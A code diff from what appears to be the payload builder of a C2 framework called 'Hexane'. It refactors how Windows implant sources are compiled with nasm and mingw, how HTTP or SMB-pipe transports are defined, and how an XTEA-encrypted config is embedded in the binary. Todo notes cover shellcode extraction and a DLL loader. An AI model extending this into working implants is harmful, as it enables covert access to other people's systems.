@@ -1,38 +1,18 @@
 use rand::Rng;
 use std::{env, fs};
+use std::path::Path;
 use std::str::FromStr;
 use std::collections::HashMap;
-use std::path::Path;
-use std::sync::{Arc, Mutex};
-use std::sync::mpsc::channel;
-
-use rayon::prelude::*;
-use crate::server::rstatic::{DEBUG_FLAGS, HASHES, INSTANCES, RELEASE_FLAGS, SESSION, STRINGS, USERAGENT};
-use crate::server::types::{NetworkType, NetworkOptions, Config, Compiler, Network, Builder, Loader, UserSession, JsonData};
-use crate::server::utils::{generate_definitions, generate_hashes, normalize_path, canonical_path_all, run_command, source_to_outpath, wrap_message};
-use crate::server::cipher::{crypt_create_key, crypt_xtea};
+use colored::Colorize;
 use crate::server::binary::embed_section_data;
+use crate::server::cipher::{crypt_create_key, crypt_xtea};
 use crate::server::error::{Error, Result};
+use crate::server::rstatic::{DEBUG_FLAGS, HASHES, INSTANCES, RELEASE_FLAGS, SESSION, STRINGS, USERAGENT};
 use crate::server::stream::Stream;
-use crate::{log_debug};
-
-fn map_config(file_path: &String) -> Result<Hexane> {
-    let json_file   = env::current_dir()?.join("json").join(file_path);
-    let contents    = fs::read_to_string(json_file).map_err(Error::Io)?;
-    let json_data   = serde_json::from_str::<JsonData>(&contents)?;
-
-    let mut instance    = Hexane::default();
-    let session         = SESSION.lock()?;
-
-    instance.group_id       = 0;
-    instance.main           = json_data.config;
-    instance.loader         = json_data.loader;
-    instance.builder        = json_data.builder;
-    instance.network        = json_data.network;
-    instance.user_session   = session.clone();
-
-    Ok(instance)
-}
+use crate::server::types::{Builder, Compiler, Config, JsonData, Loader, Network, NetworkOptions, NetworkType, UserSession};
+use crate::server::utils::{canonical_path_all, generate_definitions, generate_hashes, generate_includes, generate_object_path, normalize_path, run_command, wrap_message};
+use crate::log_debug;
+use rayon::prelude::*;
 
 pub(crate) fn load_instance(args: Vec<String>) -> Result<()> {
     if args.len() != 3 {
@@ -77,6 +57,24 @@ pub(crate) fn interact_instance(args: Vec<String>) -> Result<()> {
     Ok(())
 }
 
+fn map_config(file_path: &String) -> Result<Hexane> {
+    let json_file   = env::current_dir()?.join("json").join(file_path);
+    let contents    = fs::read_to_string(json_file).map_err(Error::Io)?;
+    let json_data   = serde_json::from_str::<JsonData>(&contents)?;
+
+    let mut instance    = Hexane::default();
+    let session         = SESSION.lock()?;
+
+    instance.group_id       = 0;
+    instance.main           = json_data.config;
+    instance.loader         = json_data.loader;
+    instance.builder        = json_data.builder;
+    instance.network        = json_data.network;
+    instance.user_session   = session.clone();
+
+    Ok(instance)
+}
+
 #[derive(Debug, Default)]
 pub struct Hexane {
     pub(crate) current_taskid:  u32,
@@ -99,9 +97,9 @@ impl Hexane {
     fn setup_instance(&mut self) -> Result<()> {
         let mut rng = rand::thread_rng();
 
-        self.compiler.build_directory   = format!("./payload/{}", self.builder.output_name);
-        self.peer_id                    = rng.gen::<u32>();
-        self.group_id                   = 0;
+        self.compiler.build_directory = format!("./payload/{}", self.builder.output_name);
+        self.peer_id = rng.gen::<u32>();
+        self.group_id = 0;
 
         self.compiler.compiler_flags = if self.main.debug {
             DEBUG_FLAGS.parse().unwrap()
@@ -121,12 +119,12 @@ impl Hexane {
     fn generate_config_bytes(&mut self) -> Result<()> {
         self.crypt_key = crypt_create_key(16);
 
-        let mut patch   = self.create_binary_patch()?;
-        let encrypt     = self.main.encrypt;
+        let mut patch = self.create_binary_patch()?;
+        let encrypt = self.main.encrypt;
 
         if encrypt {
-            let patch_cpy   = patch.clone();
-            patch           = crypt_xtea(&patch_cpy, &self.crypt_key, true)?;
+            let patch_cpy = patch.clone();
+            patch = crypt_xtea(&patch_cpy, &self.crypt_key, true)?;
         }
 
         self.config_data = patch;
@@ -166,7 +164,6 @@ impl Hexane {
 
         if let Some(network) = self.network.as_mut() {
             match (&network.r#type, &network.options) {
-
                 (NetworkType::Http, NetworkOptions::Http(ref http)) => {
                     let useragent = http.useragent.as_ref().unwrap_or(&USERAGENT);
 
@@ -203,9 +200,9 @@ impl Hexane {
         Ok(stream.buffer)
     }
 
-    fn compile_object(&mut self, mut command: String, source: String, mut flags: String) -> Result<()> {
+
+    fn compile_object(&self, mut command: String, mut flags: String) -> Result<()> {
         let mut defs: HashMap<String, Option<u32>> = HashMap::new();
-        let build = source_to_outpath(source, &self.compiler.build_directory)?;
 
         if command.trim() != "ld" && command.trim() != "nasm" {
             let encrypted   = self.main.encrypt;
@@ -215,96 +212,83 @@ impl Hexane {
                 defs.insert("DEBUG".to_string(), None);
             }
 
-            defs.insert("CONFIG_SIZE".to_string(),  Some(cfg_size));
-            defs.insert("ENCRYPTED".to_string(),    Some(if encrypted { 1u32 } else { 0u32 }));
-            defs.insert("BSWAP".to_string(),        Some(if &self.main.architecture == "amd64" { 0u32 } else { 1u32 }));
+            defs.insert("CONFIG_SIZE".to_string(), Some(cfg_size));
+            defs.insert("ENCRYPTED".to_string(), Some(if encrypted { 1u32 } else { 0u32 }));
+            defs.insert("BSWAP".to_string(), Some(if &self.main.architecture == "amd64" { 0u32 } else { 1u32 }));
 
             if let Some(network) = &self.network {
                 match network.r#type {
-                    NetworkType::Http =>    { defs.insert("TRANSPORT_HTTP".to_string(), None); }
-                    NetworkType::Smb =>     { defs.insert("TRANSPORT_PIPE".to_string(), None); }
+                    NetworkType::Http   => { defs.insert("TRANSPORT_HTTP".to_string(), None); }
+                    NetworkType::Smb    => { defs.insert("TRANSPORT_PIPE".to_string(), None); }
                 }
             }
         }
 
-        let curdir = env::current_dir()?.canonicalize()?;
-
         command.push_str(&generate_definitions(defs));
-        flags.push_str(&format!(" -I{} ", normalize_path(curdir.to_str().unwrap())));
-        flags.push_str(&format!(" -o {:?} ", build));
-
         command.push_str(&flags);
+
         run_command(&command, &self.peer_id.to_string())
     }
 
     pub fn compile_sources(&mut self) -> Result<()> {
-        let src_path        = Path::new(&self.builder.root_directory).join("src");
-        let mut components  = self.compiler.components.clone();
+        let src_path    = Path::new(&self.builder.root_directory).join("src");
+        let entries     = canonical_path_all(src_path)?;
+        let config_data = self.config_data.clone();
 
-        let entries                 = canonical_path_all(src_path)?;
-        let (err_send, err_recv)    = channel();
-        let atoms                   = Arc::new(Mutex::new(()));
-
-
-        entries.iter().for_each(|absolute_path| {
-            if !absolute_path.is_file() {
-                return;
+        for path in entries {
+            if !path.is_file() {
+                continue;
             }
 
-
-            let output  = self.builder.output_name.clone();
-            let compile = self.compiler.compiler_flags.clone();
-
+            let source      = normalize_path(path.to_str().unwrap());
             let mut command = String::new();
             let mut flags   = String::new();
 
-            let atoms_clone = Arc::clone(&atoms);
-            let err_handle  = err_send.clone();
-            let _guard      = atoms_clone.lock().unwrap();
+            let object_file = generate_object_path(&source, Path::new(&self.compiler.build_directory));
+            let object      = normalize_path(object_file.to_str().unwrap());
 
-            let absolute_str = absolute_path.to_str().unwrap();
+            let curdir              = normalize_path(env::current_dir()?.canonicalize()?.to_str().unwrap());
+            let mut user_include    = vec![curdir.to_string()];
 
-            if !Path::new(absolute_str).exists() {
-                println!("file does not exist: {}", absolute_str.to_string());
-                return;
+            if let Some(include) = self.builder.include_directories.clone() {
+                let mut paths = vec![];
+
+                for path in include {
+                    paths.push(normalize_path(path.as_str()));
+                }
+
+                user_include.extend(paths);
             }
 
-            match absolute_path.extension().and_then(|ext| ext.to_str()) {
+            let includes = generate_includes(user_include);
 
+            match path.extension().and_then(|ext| ext.to_str()) {
                 Some("asm") => {
                     command.push_str("nasm");
-                    flags = " -f win64 ".to_string();
-                    flags.push_str(&absolute_str);
+                    flags = format!(" -f win64 -o {} {}", object, source);
                 }
 
                 Some("cpp") => {
                     command.push_str("x86_64-w64-mingw32-g++");
-                    flags.push_str(" -c ");
-                    flags.push_str(&absolute_str);
-                    flags.push_str(" ");
-                    flags.push_str(compile.as_str());
+                    flags.push_str(&format!(" -c {} {} -o {} {}", source, includes, object, self.compiler.compiler_flags));
                 }
 
                 _ => {
-                    return;
+                    continue;
                 }
             }
 
-            if let Err(e) = self.compile_object(command, absolute_str.to_string(), flags) {
-                err_handle.send(e).unwrap();
-            } else {
-                components.push(output);
+            if let Err(e) = self.compile_object(command, flags) {
+                return Err(Error::Custom(format!("compile_sources::{e}")));
             }
-        });
-
-        if let Ok(e) = err_recv.try_recv() {
-            return Err(Error::Custom(format!("compile_sources::{e}")));
         }
 
         log_debug!(&"Linking final objects".to_string());
-        embed_section_data(&self.builder.output_name, ".text$F", &self.config_data.as_slice())?;
+        // todo: link objects
+        embed_section_data(&self.builder.output_name, ".text$F", &config_data)?;
+        // todo: extract shellcode
+        // todo: create dll loader
 
-        // TODO: link all objects
         Ok(())
     }
 }
